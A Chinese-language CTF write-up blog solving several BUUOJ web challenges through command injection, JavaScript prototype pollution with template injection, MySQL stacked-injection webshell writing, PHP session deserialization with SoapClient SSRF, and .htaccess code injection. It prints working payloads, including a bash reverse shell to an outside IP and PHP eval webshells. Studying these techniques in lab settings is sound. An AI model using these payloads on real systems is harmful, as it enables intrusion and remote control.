看了wp\n\n```\n/user.php?page=m4aaannngggeee\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689742213512-efa5426d-7232-415f-bca5-7372374dc56a.png)\n\n由于不能让move_uploaded_file报错，文件名里不能有/这种路径字符  \n\n```javascript\nif(is_uploaded_file($_FILES['file']['tmp_name'])){\n    if(!move_uploaded_file($_FILES['file']['tmp_name'],$path.$filename)){\n        die(\"error:can not move\");\n    }\n```\n\n所以如果我们执行命令 `ls /`这样 那么就会die出去 没有回显 难怪我一开始一直在这里困惑 \n\n翻别人的博客看wp真是一件美事啊:)\n\n```\n;cd ..;ls;#\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741475222-474413c2-512d-4fdc-9496-c77c237cf241.png)\n\n```\n;cd ..;cat flag_233333;#\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689741512376-6e560d1f-9068-48c5-a07b-73a7ed625bb8.png)\n\n# 118、[强网杯 2019]Upload\n\n又要代码审计先留着\n\n# 119、[GYCTF2020]Ez_Express\n\n一道js的原型链污染+ssti的组合题目 挺不错的\n\n首先访问主页 他让我们用ADMIN 登录 然后存在一个源码泄露 \n\n`/www.zip`下到源码\n\n放一下重要的源码：\n\n```javascript\nvar express = require('express');\nvar router = express.Router();\nconst isObject = obj => obj && obj.constructor && obj.constructor === Object;\nconst merge = (a, b) => {\n  for (var attr in b) {\n    if (isObject(a[attr]) && isObject(b[attr])) {\n      merge(a[attr], b[attr]);\n    } else {\n      a[attr] = b[attr];\n    }\n  }\n  return a\n}\nconst clone = (a) => {\n  return merge({}, a);\n}\nfunction safeKeyword(keyword) {\n  if(keyword.match(/(admin)/is)) {\n    return keyword\n  }\n\n  return undefined\n}\n\nrouter.get('/', function (req, res) {\n  if(!req.session.user){\n    res.redirect('/login');\n  }\n  res.outputFunctionName=undefined;\n  res.render('index',data={'user':req.session.user.user});\n});\n\n\nrouter.get('/login', function (req, res) {\n  res.render('login');\n});\n\n\n\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n    if(safeKeyword(req.body.userid)){\n      res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n    }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n\n  }\n  res.redirect('/'); ;\n});\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = router;\n```\n\n看到了我们的老朋友 merge() 呢就肯定存在原型链污染\n\n顺着看逻辑 首先是登陆\n\n```javascript\nrouter.post('/login', function (req, res) {\n  if(req.body.Submit==\"register\"){\n    if(safeKeyword(req.body.userid)){\n      res.end(\"<script>alert('forbid word');history.go(-1);</script>\") \n    }\n    req.session.user={\n      'user':req.body.userid.toUpperCase(),\n      'passwd': req.body.pwd,\n      'isLogin':false\n    }\n    res.redirect('/'); \n  }\n  else if(req.body.Submit==\"login\"){\n    if(!req.session.user){res.end(\"<script>alert('register first');history.go(-1);</script>\")}\n    if(req.session.user.user==req.body.userid&&req.body.pwd==req.session.user.passwd){\n      req.session.user.isLogin=true;\n    }\n    else{\n      res.end(\"<script>alert('error passwd');history.go(-1);</script>\")\n    }\n\n  }\n  res.redirect('/'); ;\n});\n```\n\n`'user':req.body.userid.toUpperCase()`这里存在一个把我们名字转为大写的操作\n\n其实考了javascript大小写特性\n\n在js中 有一种类字符 比如`admın`看起来像我们平常的admin 但是他的`ı`字符并不是我们常用的i 但是经过这个toUpperCase()函数之后 就会变为大写的`I` 那么就可以bypass了 当然也会存在转小写的操作 都是一个思路\n\n参考：https://www.leavesongs.com/HTML/javascript-up-low-ercase-tip.html\n\n注册`admın` 然后登录就用`ADMIN` 成功登录\n\n然后到了`/action`路由\n\n```javascript\nrouter.post('/action', function (req, res) {\n  if(req.session.user.user!=\"ADMIN\"){res.end(\"<script>alert('ADMIN is asked');history.go(-1);</script>\")} \n  req.session.user.data = clone(req.body);\n  res.end(\"<script>alert('success');history.go(-1);</script>\");  \n});\n```\n\n `req.session.user.data = clone(req.body);`这一条语句用到了我们的原型链污染\n\n那么应该污染谁呢 暂且放着\n\n再来看`/info`路由\n\n```javascript\nrouter.get('/info', function (req, res) {\n  res.render('index',data={'user':res.outputFunctionName});\n})\nmodule.exports = router;\n```\n\n又是老朋友render 看到他就想到ssti \n\n可以看到如果我们能控制`utputFunctionName`这个参数我们就可以进行ssti了\n\n跟踪一下 竟然发现这个变量没有定义\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748463034-f5b3908d-9721-433c-aabf-caf52a779bc9.png)\n\n这就很诡异了 所以我们可以在`/action`路由下对他进行原型链污染  然后在`/info `对他进行ssti 这样就能getshell了\n\n请求包paylaod:\n\n```javascript\nPOST /action HTTP/1.1\nHost: a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81\nContent-Length: 178\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81\nContent-Type: application/json\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://a041d509-23fe-47c0-8d98-0f5b4ac46eaf.node4.buuoj.cn:81/\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; session=s%3A3n0kVmpVgibTGbZVYa8G39JKQSWntKeb.vA90xq%2FPvNzD14nbbu%2BW1WAfLwNX6o9st2OOFs%2Bgyqc\nConnection: close\n\n{\"Submit\":\"\",\"lua\":\"\",\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \\\"bash -i >& /dev/tcp/8.130.34.53/7777 0>&1\\\"')\"}}\n```\n\n这里要注意就是我们提交的payload形式一定要是json格式的  `Content-Type: application/json`\n\n然后我这里是用反弹shell\n\n访问`/info `  成功\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689748624364-dcb3a261-6eda-4b4c-b527-ca68431e5347.png)\n\n# 120、[SUCTF 2018]MultiSQL\n\n考点：mysql预编译 复习一下旧知识 都好久了 忘了\n\n看标题就是sql注入\n\n首先在注册的时候就多加个`'` 看看会怎样 一般这里可能会存在二次注入之类的\n\n发现被转义了 作罢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838045915-1e652331-c3d3-49a1-8689-efe900b70c8f.png)\n\n点用户信息发现url不对劲\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689838230226-da7aa30a-ee41-4f54-b33b-ad23d0c2f0f4.png)\n\n感觉这里存在sql注入\n\nfuzz 发现过滤了`union，select ，&，|` 那么我们一般的select查询就不要想了\n\n然后这道题目其实考察的是堆叠注入\n\n然后搭配预编译写🐎\n\n有两种方式 一种是用char()写🐎 另一种是16进制搭配hex()函数写🐎\n\n在做这道题目之前还从来没在sql注入的时候写过🐎 属于是第一次见了\n\n首先是预编译 在很早以前 做buu题目的时候就见过预编译\n\n首先是`set @A=sql语句;prepare B from @A;execute B;`格式就是如此\n\n这里的sql语句就是我们要在mysql中写一句话木马的语句 如下格式\n\n其实我最懵逼的就是这个路径为什么要在`/favicon`下 很奇怪 为什么 直接在`/var/www/html`就不行 看了很多wp 就是没提及这一点  之后在神の的wp中 发现是题目可以扫到一个这个目录 真夸张 御剑的字典没这个目录 如果真在比赛中做 我百分之百做不出来\n\n```\nselect '<?php eval($_POST[cmd]);?>' into outfile '/var/www/html/favicon/shell.php';\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689840034510-98325feb-b607-4124-bebc-3c2155883f5d.png)\n\n## 第一种char()写🐎\n\n原理：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841296825-af77f53d-2cd9-4628-bce9-ce1423b66c83.png)\n\n就是利用char函数 bypass 对select等字符的限制\n\n随便写个脚本 跑一下就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841351215-aff04d5a-2019-4055-8abc-c8cf413c22c4.png)\n\npayload:\n\n`select '<?php eval($_POST[x]);?>' into outfile '/var/www/html/favicon/1.php';` 转成对应的ascii编码的字符 然后搭配预编译打入即可\n\n## 第二种 hex()搭配十六进制写🐎\n\npayload和上面一样只不过 这里转为16进制就行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841581083-5f4b6cae-f94e-4b3f-b789-3d2336b40959.png)\n\n原理：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689841713358-d2c8e3ff-c663-4305-85dc-74b7785188e7.png)\n\npayload:\n\n```\nselect '<?php eval($_POST[x]);?>' into outfile '/var/www/html/favicon/1.php';\nset @A=0x73656C65637420273C3F706870206576616C28245F504F53545B636D645D293B3F3E2720696E746F206F757466696C6520272F7661722F7777772F68746D6C2F66617669636F6E2F7368656C6C2E706870273B;prepare B from @A;execute B;\n```\n\n\n\n# 121、bestphp's revenge\n\n啊啊啊啊  又是信息爆炸的一题 真是一题比一题炸裂 一天做一题弄明白脑子就已经炸了\n\n一共有两个文件\n\nindex.php\n\n```php\n<?php\n  highlight_file(__FILE__);\n$b = 'implode';\ncall_user_func($_GET['f'], $_POST);\nsession_start();\nif (isset($_GET['name'])) {\n  $_SESSION['name'] = $_GET['name'];\n}\nvar_dump($_SESSION);\n$a = array(reset($_SESSION), 'welcome_to_the_lctf2018');\ncall_user_func($b, $a);\n?>\n```\n\nflag.php\n\n```php\nonly localhost can get flag!session_start();\necho 'only localhost can get flag!';\n$flag = 'LCTF{*************************}';\nif($_SERVER[\"REMOTE_ADDR\"]===\"127.0.0.1\"){\n       $_SESSION['flag'] = $flag;\n   }\nonly localhost can get flag!\n```\n\n看flag.php 我们需要本地访问才能拿到flag \n\n但是我们直接通过xff修改ip获取不到 这里就很像之前做的一道题目\n\n要通过ssrf 打才行\n\n来分析一下index.php\n\n## call_user_func()\n\n首先是一个call_user_func() 第一个参数作为回调函数执行 第二个参数作为回调函数的参数传入\n\n但是这里一开始我在想为什么不直接通过system()当回调函数 直接进行命令执行 \n\n后来发现$_POST只能以键值 也就是A=B的形式传入才行 \n\n只传入一个A是post不上去的 所以A=B的形式肯定不符合call_user_func()第二个参数无果\n\n除此之外 这个函数不仅仅只能传入函数 还可以通过数组包含类的方式执行类的方法\n\n如下：\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689863056915-faa2b80d-4893-41f9-afaa-78862cad8a45.png)\n\n 把第一个值当作类名，第二个值当作方法进行回调\n\n## php session反序列化机制\n\n其次是php session反序列化机制 https://blog.spoock.com/2016/10/16/php-serialize-problem/ 具体可参考这个文章 这个师傅写的很详细\n\n之前在ctfshow 刷题的时候也遇到了\n\n```\nsession.serialize_handler   string --定义用来序列化/反序列化的处理器名字。默认使用php\n```\n\nsession.serialize_handler是用来设置session的序列话引擎的，除了默认的PHP引擎之外，还存在其他引擎，不同的引擎所对应的session的存储方式不相同。  \n\n一共有三种\n\n- php_binary:存储方式是，键名的长度对应的ASCII字符+键名+经过serialize()函数序列化处理的值\n- php:存储方式是，键名+竖线+经过serialize()函数序列处理的值\n- php_serialize(php>5.5.4):存储方式是，经过serialize()函数序列化处理的值\n\n存储机制：\n\nphp中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。\n存储的文件是以sess_sessionid来进行命名的，文件的内容就是session值的序列话之后的内容。\n\n当序列化的引擎和反序列化的引擎不一致时，就可以利用引擎之间的差异产生序列化注入漏洞。  \n\n例如传入`$_SESSION['name']='|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}';` \n\n序列化引擎使用的是php_serialize，那么储存的session文件为\n\n```\na:1:{s:4:\"name\";s:5:\"|O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}\";}\n```\n\n而反序列化引擎如果使用的是php，就会把|作为作为key和value的分隔符。把`a:1:{s:4:\"name\";s:5:\"`当作键名，而把`O:5:\"Smi1e\":1:{s:4:\"test\";s:3:\"AAA\";}`当作经过serialize()函数处理过的值，最后会把它进行unserialize处理，此时就构成了一次反序列化注入攻击。  \n\n## SoapClient\n\n再就是到可以ssrf的类 之前刷ctfshow的题目时候就遇到曾经用过这个类 SoapClient  它可以发送http请求包\n\n 利用php原生类SoapClient中的__call方法进行SSRF\n\n在新建一个**SoapClient**的类对象的时候，需要有两个参数，一个是字符串形式的**wsdl**，另一个是数组形式的**options**。而**wsdl**在开发中十分常见，在安全中用的比较少 ，并且这里也用不到，所以设为null就行了。\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689864728281-c032ebaf-c62c-4b99-835a-e88cdcfe9cc7.png)\n\n构造序列化字符串：\n\n```php\n<?php\n$url = \"http://127.0.0.1/flag.php\";\n$b = new SoapClient(null, array('uri' => $url, 'location' => $url));\n$a = serialize($b);\necho \"|\" . urlencode($a);\n?>\n|O%3A10%3A%22SoapClient%22%3A36%3A%7Bs%3A15%3A%22%00SoapClient%00uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00style%22%3BN%3Bs%3A15%3A%22%00SoapClient%00use%22%3BN%3Bs%3A20%3A%22%00SoapClient%00location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A17%3A%22%00SoapClient%00trace%22%3Bb%3A0%3Bs%3A23%3A%22%00SoapClient%00compression%22%3BN%3Bs%3A15%3A%22%00SoapClient%00sdl%22%3BN%3Bs%3A19%3A%22%00SoapClient%00typemap%22%3BN%3Bs%3A22%3A%22%00SoapClient%00httpsocket%22%3BN%3Bs%3A19%3A%22%00SoapClient%00httpurl%22%3BN%3Bs%3A18%3A%22%00SoapClient%00_login%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_use_digest%22%3Bb%3A0%3Bs%3A19%3A%22%00SoapClient%00_digest%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_host%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_proxy_port%22%3BN%3Bs%3A24%3A%22%00SoapClient%00_proxy_login%22%3BN%3Bs%3A27%3A%22%00SoapClient%00_proxy_password%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_exceptions%22%3Bb%3A1%3Bs%3A21%3A%22%00SoapClient%00_encoding%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_classmap%22%3BN%3Bs%3A21%3A%22%00SoapClient%00_features%22%3BN%3Bs%3A31%3A%22%00SoapClient%00_connection_timeout%22%3Bi%3A0%3Bs%3A27%3A%22%00SoapClient%00_stream_context%22%3Bi%3A0%3Bs%3A23%3A%22%00SoapClient%00_user_agent%22%3BN%3Bs%3A23%3A%22%00SoapClient%00_keep_alive%22%3Bb%3A1%3Bs%3A23%3A%22%00SoapClient%00_ssl_method%22%3BN%3Bs%3A25%3A%22%00SoapClient%00_soap_version%22%3Bi%3A1%3Bs%3A22%3A%22%00SoapClient%00_use_proxy%22%3BN%3Bs%3A20%3A%22%00SoapClient%00_cookies%22%3Ba%3A0%3A%7B%7Ds%3A29%3A%22%00SoapClient%00__default_headers%22%3BN%3Bs%3A24%3A%22%00SoapClient%00__soap_fault%22%3BN%3Bs%3A26%3A%22%00SoapClient%00__last_request%22%3BN%3Bs%3A27%3A%22%00SoapClient%00__last_response%22%3BN%3Bs%3A34%3A%22%00SoapClient%00__last_request_headers%22%3BN%3Bs%3A35%3A%22%00SoapClient%00__last_response_headers%22%3BN%3B%7D\n```\n\n至于这一行`$b = new SoapClient(null, array('uri' => $url, 'location' => $url));`\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689865079531-bdee449b-dea8-4904-858a-844632b40566.png)\n\n本题的思路：\n\n利用回调函数覆盖session序列化引擎为php_serilaze  在代码中这样`session_start(serialize_hander=php_serialize)`  可以查php手册能这样修改  一开始问gpt说不能这样 着实是被误导了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689867197838-9f5e2a67-85ef-4ab1-80ab-409e4fab2459.png)\n\n构造SSRF的Soap类的序列化字符串配合序列化注入写入session文件 文件名要用phpsessid=8位自己设置一下\n\n利用变量覆盖漏洞，用extract()覆盖掉变量b为回调函数call_user_func，回调函数调用Soap类的未知方法，触发__call方法进行SSRF访问flag.php。把flag写入session，再把session打印出来即可。\n\n请求包：\n\n```php\nPOST /index.php?f=session_start&name=|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1\nHost: b409417f-d781-4e26-ae3a-96e176b88d1a.node4.buuoj.cn:81\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=aaaaaaaa\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 31\n\nserialize_handler=php_serialize\n```\n\n首先先将php序列化引擎设置为php_serialize  写入session文件  \n\n源码中session_start()反序列化使用的是php引擎 \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914183098-3d85e411-a2a5-4148-9710-278f7949f707.png)\n\n接下里我们覆盖变量b，利用call_user_func调用SoapClient类中的不存在方法，触发__call方法，执行ssrf。并获得访问flag.php的PHPSESSID。  \n\n 这里的$a数组就是array(\"SoapClient\",\"welcome_to_the_lctf2018\")\n\n也就是`call_user_func(call_user_func(\"SoapClient\",\"welcome_to_the_lctf2018\"))` 因为SoapClient不存在welcome_to_the_lctf2018方法 所以就调用__call魔术方法了\n\n```php\nPOST /?f=extract&name=SoapClient HTTP/1.1\nHost: 603457b5-b6be-4cdb-9b14-ec8f4d39f71f.node4.buuoj.cn:81\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=66666666\nConnection: close\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 16\n\nb=call_user_func\n```\n\n这样根据flag.php 就会将flag写入session\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914873442-69582790-3062-440f-850f-34d2eb748016.png)\n\n找到phpsessid  \n\n服务器可以根据PHPSESSID来识别用户session,获取保存在服务器session文件中的相关数据,如用户状态、购物车内容等。  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914689440-f88fdcbe-0b73-4659-99df-fd94033ce083.png)\n\n然后将phpsessid改为保存flag的那个就可以了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914737673-48bf1329-9c2b-46d5-bdd8-0d533f171351.png)\n\n那么为什么修改phpsessid就能得到flag那 \n\n我是这么理解的：我们都知道session是保存我们登录状态的识别身份的东西，我们访问flag.php以后将flag保存在session[flag]中 我们只要将我们身份改为访问flag.php那个身份就行了 然后indx.php中的`var_dump($_SESSION)`就会将flag输出出来\n\n# 122、[安洵杯 2019]不是文件上传\n\n # 123、[羊城杯2020]easyphp\n\n一道关于.htaccess的题目 \n\n给了源码;\n\n```php\n<?php\n    $files = scandir('./'); \n    foreach($files as $file) {\n        if(is_file($file)){\n            if ($file !== \"index.php\") {\n                unlink($file);\n            }\n        }\n    }\n    if(!isset($_GET['content']) || !isset($_GET['filename'])) {\n        highlight_file(__FILE__);\n        die();\n    }\n    $content = $_GET['content'];\n    if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {\n        echo \"Hacker\";\n        die();\n    }\n    $filename = $_GET['filename'];\n    if(preg_match(\"/[^a-z\\.]/\", $filename) == 1) {\n        echo \"Hacker\";\n        die();\n    }\n    $files = scandir('./'); \n    foreach($files as $file) {\n        if(is_file($file)){\n            if ($file !== \"index.php\") {\n                unlink($file);\n            }\n        }\n    }\n    file_put_contents($filename, $content . \"\\nHello, world\");\n?>\n```\n\n大致浏览就是当前目录下只能存在index.php 其他文件都会被删除 \n\n但是这道题目可以创建其他文件在当前目录下 真的离谱 不过写入也没用 这道题目只容许index.php解析 其他php文件代码都是原样输出 不会解析的\n\n然后这道题目要利用.htaccess 这是一个php配置文件 那么为什么不用.user.ini呢\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920107307-9ef4226b-6c09-496c-a88a-9e74d6abd4e4.png)\n\n因为.htaccess文件作用的范围更大  它比较灵活，不需要重启服务器，也不需要管理员权限  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920342664-afd98b25-24e8-43c4-9bec-4f10ce93dd4b.png)\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920296884-1a0e4198-a879-4cb9-9477-c73e849b53c9.png)\n\n我们可以生成一个.htaccess文件去配置文件包含 \n\n这样在每个php文件中都包含一个.htaccess文件 有点套娃的感觉\n\n并且我们在.htaccess文件中以注释方法写上我们的恶意代码 这样就不会影响我们的.htaccess文件正常运行了\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689920490507-9295d8b4-8c6b-4185-9555-4a339bbc66f1.png)\n\n所以内容为：\n\n```php\nphp_value auto_prepend_file .htaccess\n#<?php phpinfo();?>\n```\n\n但是根据源码 file被waf了 \n\n但是可以用`\\`来拼接上下行 我在上面也说到了\n\n所以改为\n\n```php\nphp_value auto_prepend_f\\\nile .htaccess\n#<?php phpinfo();?>\n```\n\n并且\n\n`file_put_contents($filename, $content . \"\\nHello, world\");`会在后面加上没意义的内容 影响我们的.htaccess文件正常执行 所以再加一个`\\`转义掉`\\n`不让他换行\n\n这样拼接的内容就变为`\\\\nHello, world`了\n\n所以最payload形式:\n\n```php\nphp_value auto_prepend_f\\\nile .htaccess\n#<?php phpinfo();?>\\\n?filename=.htaccess&content=php_value%20auto_prepend_f%5C%0Aile%20.htaccess%0A%23%3C%3Fphp%20system('cat%20%2Ffla%3F')%3B%3F%3E%5C\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921496468-5989a398-9503-40ac-9ab4-563419de6dfb.png)\n\n其实一开始我有个问题就是 `#<?php phpinfo();?>\\`被包含在index.php中 前面不是有个`#`吗 \n\n`#`在php中也是单行注释符 为什么会执行这一行呢 ？\n\n其实#根本就不在php代码内容中 也就是不在php代码`<?php ?>`中 不会当作注释符 只有在`<?php ?>`里面才会被当作注释符\n\n一下demo简单理解\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689921829164-36d8fada-eb71-4646-8c59-c4ba49d8b785.png)\n\n# 124、[GXYCTF2019]BabysqliV3.0\n\n这道题目看标题以为是sql注入 但是其实预期解是phar反序列化 最重要的是代码审计\n\n弱口令 admin/password\n\n看url 很奇怪 感觉存在任意文件读取\n\n```\n/home.php?file=php://filter/read=convert.base64-encode/resource=upload\n```\n\nupload.php\n\n```php\n<?php\nerror_reporting(0);\nclass Uploader{\n    public $Filename;\n    public $cmd;\n    public $token;\n    \n\n    function __construct(){\n        $sandbox = getcwd().\"/uploads/\".md5($_SESSION['user']).\"/\";\n        $ext = \".txt\";\n        @mkdir($sandbox, 0777, true);\n        if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n            $this->Filename = $_GET['name'];\n        }\n        else{\n            $this->Filename = $sandbox.$_SESSION['user'].$ext;\n        }\n\n        $this->cmd = \"echo '<br><br>Master, I want to study rizhan!<br><br>';\";\n        $this->token = $_SESSION['user'];\n    }\n\n    function upload($file){\n        global $sandbox;\n        global $ext;\n\n        if(preg_match(\"[^a-z0-9]\", $this->Filename)){\n            $this->cmd = \"die('illegal filename!');\";\n        }\n        else{\n            if($file['size'] > 1024){\n                $this->cmd = \"die('you are too big (′▽`〃)');\";\n            }\n            else{\n                $this->cmd = \"move_uploaded_file('\".$file['tmp_name'].\"', '\" . $this->Filename . \"');\";\n            }\n        }\n    }\n\n    function __toString(){\n        global $sandbox;\n        global $ext;\n        // return $sandbox.$this->Filename.$ext;\n        return $this->Filename;\n    }\n\n    function __destruct(){\n        if($this->token != $_SESSION['user']){\n            $this->cmd = \"die('check token falied!');\";\n        }\n        eval($this->cmd);\n    }\n}\n\nif(isset($_FILES['file'])) {\n    $uploader = new Uploader();\n    $uploader->upload($_FILES[\"file\"]);\n    if(@file_get_contents($uploader)){\n        echo \"下面是你上传的文件：<br>\".$uploader.\"<br>\";\n        echo file_get_contents($uploader);\n    }\n}\n\n?>\n```\n\nhome.php\n\n```php\n<?php\nsession_start();\necho \"<meta http-equiv=\\\"Content-Type\\\" content=\\\"text/html; charset=utf-8\\\" /> <title>Home</title>\";\nerror_reporting(0);\nif(isset($_SESSION['user'])){\n\tif(isset($_GET['file'])){\n\t\tif(preg_match(\"/.?f.?l.?a.?g.?/i\", $_GET['file'])){\n\t\t\tdie(\"hacker!\");\n\t\t}\n\t\telse{\n\t\t\tif(preg_match(\"/home$/i\", $_GET['file']) or preg_match(\"/upload$/i\", $_GET['file'])){\n\t\t\t\t$file = $_GET['file'].\".php\";\n\t\t\t}\n\t\t\telse{\n\t\t\t\t$file = $_GET['file'].\".fxxkyou!\";\n\t\t\t}\n\t\t\techo \"当前引用的是 \".$file;\n\t\t\trequire $file;\n\t\t}\n\t\t\n\t}\n\telse{\n\t\tdie(\"no permission!\");\n\t}\n}\n?>\n```\n\n## 分析：\n\n代码审计 代码审计太重要了 \n\n我们先正常上传一个文件\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689928467956-3270cb40-1179-4a4e-b07c-0830b11f0a61.png)\n\n爆出了保存路径 并且他直接显示出了我们的内容GIF89a？？？？ 但是我们的文件后缀已经被改为了txt 所以我们的php代码无法执行\n\n看看为什么会直接输出的代码逻辑，可见我们上传文件后 会立即将文件经过处理之后输出\n\n```php\nif(isset($_FILES['file'])) {\n    $uploader = new Uploader();\n    $uploader->upload($_FILES[\"file\"]);\n    if(@file_get_contents($uploader)){\n        echo \"下面是你上传的文件：<br>\".$uploader.\"<br>\";\n        echo file_get_contents($uploader);\n    }\n}\n```\n\n再来看这一部分 经典创建一个沙盒 \n\n并且注意到\n\n```php\n       if(isset($_GET['name']) and !preg_match(\"/data:\\/\\/ | filter:\\/\\/ | php:\\/\\/ | \\./i\", $_GET['name'])){\n            $this->Filename = $_GET['name'];\n        }\n```\n\nname我们可控 如果我们get一个name并且不包含他正则的伪协议字符 那么就不会被他修改文件名\n\n如果没有设置或者包含他正则的字符\n\n我们文件名改为`$sandbox.$_SESSION['user'].$ext;` 